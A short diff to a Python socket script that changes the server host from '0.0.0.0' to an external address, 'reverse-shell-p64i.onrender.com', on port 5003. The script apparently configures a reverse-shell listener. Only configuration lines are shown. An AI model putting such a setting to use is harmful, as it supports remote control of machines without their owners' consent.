@@ -1,7 +1,7 @@
 import socket
 
 # Server configuration
-SERVER_HOST = "0.0.0.0"
+SERVER_HOST = "https://reverse-shell-p64i.onrender.com"
 SERVER_PORT = 5003
 BUFFER_SIZE = 1024 * 128
 
